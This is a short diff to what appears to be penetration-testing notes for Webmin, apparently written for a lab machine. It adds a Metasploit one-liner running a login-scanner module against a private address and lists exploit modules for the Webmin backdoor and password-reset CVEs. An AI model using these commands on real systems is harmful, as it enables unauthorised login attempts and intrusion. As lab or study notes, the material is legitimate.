@@ -9,7 +9,8 @@ curl -k https://target.com:10000
 
 # MSFConsole
 ```powershell
-# Metasploit ilə versiya + exploit
+msfconsole -q -x "use auxiliary/scanner/http/webmin_login; set RHOSTS 10.129.2.1; set RPORT 10000; set SSL true; run"
+
 msfconsole
 use exploit/unix/webapp/webmin_backdoor        # CVE-2019-15231
 use exploit/unix/webapp/webmin_password_reset  # CVE-2019-15107
